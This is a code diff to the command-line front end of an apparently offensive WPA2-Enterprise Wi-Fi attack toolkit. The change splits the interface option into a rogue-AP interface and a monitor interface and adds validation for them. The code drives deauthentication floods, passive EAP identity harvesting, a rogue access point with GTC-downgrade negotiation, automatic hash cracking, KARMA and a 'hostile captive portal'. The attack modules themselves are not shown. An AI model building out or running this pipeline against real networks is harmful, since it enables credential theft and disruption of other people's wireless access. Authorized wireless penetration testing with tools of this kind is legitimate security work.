@@ -32,6 +32,30 @@ def check_deps():
     print("[+] All dependencies found\n")
 
 
+def validate_interfaces(iface_ap, iface_mon):
+    """Validate that two interfaces are distinct and exist on the system."""
+    if iface_ap == iface_mon:
+        print(f"[!] AP interface and monitor interface must be different!")
+        print(f"[!] You provided '{iface_ap}' for both.")
+        print(f"[!] Use two separate wireless adapters.")
+        sys.exit(1)
+
+    for name, iface in [("AP", iface_ap), ("Monitor", iface_mon)]:
+        if not os.path.exists(f"/sys/class/net/{iface}"):
+            print(f"[!] {name} interface '{iface}' not found on this system.")
+            print(f"[!] Available interfaces:")
+            try:
+                for dev in os.listdir("/sys/class/net"):
+                    print(f"      - {dev}")
+            except OSError:
+                pass
+            sys.exit(1)
+
+    print(f"[+] AP interface:      {iface_ap}")
+    print(f"[+] Monitor interface: {iface_mon}")
+    print()
+
+
 # ── Commands ────────────────────────────────────────────────────
 
 def cmd_setup(args):
@@ -53,13 +77,14 @@ def cmd_scan(args):
 
 def cmd_attack(args):
     check_deps()
+    validate_interfaces(args.iface_ap, args.iface_mon)
 
     essid = bssid = None
     channel = args.channel
 
     if not args.essid:
         from modules.scanner import interactive_target_select
-        target = interactive_target_select(args.iface, args.scan_time)
+        target = interactive_target_select(args.iface_mon, args.scan_time)
         if not target:
             sys.exit(1)
         essid   = target["essid"]
@@ -73,12 +98,12 @@ def cmd_attack(args):
 
     if args.probe and bssid:
         from modules.eap_probe import probe_eap_methods
-        probe_eap_methods(args.iface, bssid, essid)
+        probe_eap_methods(args.iface_mon, bssid, essid)
         attacks_run.append("EAP Method Probe")
 
     if args.harvest:
         from modules.identity import harvest_identities
-        harvest_identities(args.iface, duration=30)
+        harvest_identities(args.iface_mon, duration=30)
         attacks_run.append("EAP Identity Harvesting")
 
     if args.autocrack:
@@ -91,7 +116,7 @@ def cmd_attack(args):
         from modules.deauth import deauth_attack
         t = threading.Thread(
             target=deauth_attack,
-            args=(args.iface, bssid, None, 0),
+            args=(args.iface_mon, bssid, None, 0),
             daemon=True
         )
         t.start()
@@ -101,7 +126,7 @@ def cmd_attack(args):
 
     from modules.rogue_ap import launch_ap
     launch_ap(
-        iface=args.iface,
+        iface=args.iface_ap,
         ssid=essid,
         channel=channel,
         negotiate=args.negotiate,
@@ -191,12 +216,20 @@ def cmd_menu(args):
     print("╚══════════════════════════════════════╝")
 #in crack hashes ..in future te user can load his custom wordlist
     choice = input("\n[?] Enter number: ").strip()
-    iface  = input("[?] Interface (e.g. wlan0mon): ").strip()
+
+    # Modes 3/4 need dual interfaces, others need a single interface
+    if choice in ("3", "4"):
+        iface_ap  = input("[?] AP interface (e.g. wlan1): ").strip()
+        iface_mon = input("[?] Monitor interface (e.g. wlan0mon): ").strip()
+    elif choice in ("1", "9", "10"):
+        iface_ap = iface_mon = None  # not needed
+    else:
+        iface = input("[?] Interface (e.g. wlan0mon): ").strip()
 
     class A: pass
 
     if choice == "1":
-        a = A(); a.iface = iface
+        a = A()
         cmd_setup(a)
 
     elif choice == "2":
@@ -209,7 +242,8 @@ def cmd_menu(args):
         ch    = input("[?] Channel (default 6): ").strip()               or "6"
         mode  = input("[?] Negotiate [balanced/gtc-downgrade/default]: ").strip() or "balanced"
         a = A()
-        a.iface=iface; a.essid=essid; a.bssid=bssid
+        a.iface_ap=iface_ap; a.iface_mon=iface_mon
+        a.essid=essid; a.bssid=bssid
         a.channel=int(ch); a.negotiate=mode; a.scan_time=15
         a.deauth=True; a.clone_mac=True; a.boost=True
         a.probe=True; a.harvest=True; a.autocrack=True; a.report=True
@@ -221,7 +255,8 @@ def cmd_menu(args):
         ch    = input("[?] Channel (default 6): ").strip() or "6"
         mode  = input("[?] Negotiate [balanced/gtc-downgrade/default]: ").strip() or "balanced"
         a = A()
-        a.iface=iface; a.essid=essid; a.bssid=bssid
+        a.iface_ap=iface_ap; a.iface_mon=iface_mon
+        a.essid=essid; a.bssid=bssid
         a.channel=int(ch); a.negotiate=mode; a.scan_time=15
         a.deauth=False; a.clone_mac=False; a.boost=True
         a.probe=False; a.harvest=False; a.autocrack=False; a.report=False
@@ -286,12 +321,16 @@ def main():
 
     # scan
     p = sub.add_parser("scan", help="Scan for WPA2-Enterprise networks")
-    p.add_argument("-i", "--iface", required=True)
+    p.add_argument("-i", "--iface", required=True,
+                   help="Monitor-mode interface")
     p.add_argument("-t", "--time",  type=int, default=15)
 
-    # attack
-    p = sub.add_parser("attack", help="Full attack pipeline")
-    p.add_argument("-i", "--iface",     required=True)
+    # attack  ── requires TWO interfaces
+    p = sub.add_parser("attack", help="Full attack pipeline (dual-interface)")
+    p.add_argument("-a", "--iface-ap",  required=True,
+                   help="Interface for rogue AP (e.g. wlan1)")
+    p.add_argument("-m", "--iface-mon", required=True,
+                   help="Monitor-mode interface for deauth/scan/harvest (e.g. wlan0mon)")
     p.add_argument("--essid",           default=None)
     p.add_argument("--bssid",           default=None)
     p.add_argument("--channel",         type=int, default=6)
@@ -309,7 +348,8 @@ def main():
 
     # deauth
     p = sub.add_parser("deauth", help="Deauthentication attack")
-    p.add_argument("-i", "--iface",  required=True)
+    p.add_argument("-i", "--iface",  required=True,
+                   help="Monitor-mode interface")
     p.add_argument("--bssid",        required=True)
     p.add_argument("--client",       default=None)
     p.add_argument("--count",        type=int, default=100)
@@ -317,16 +357,19 @@ def main():
 
     # harvest
     p = sub.add_parser("harvest", help="Passive EAP identity harvesting")
-    p.add_argument("-i", "--iface", required=True)
+    p.add_argument("-i", "--iface", required=True,
+                   help="Monitor-mode interface")
     p.add_argument("-t", "--time",  type=int, default=60)
 
     # karma
     p = sub.add_parser("karma", help="KARMA attack")
-    p.add_argument("-i", "--iface", required=True)
+    p.add_argument("-i", "--iface", required=True,
+                   help="Wireless interface for KARMA AP")
 
     # portal
     p = sub.add_parser("portal", help="Hostile captive portal")
-    p.add_argument("-i", "--iface",   required=True)
+    p.add_argument("-i", "--iface",   required=True,
+                   help="Interface for rogue AP")
     p.add_argument("--essid",         required=True)
     p.add_argument("--channel",       type=int, default=6)
 
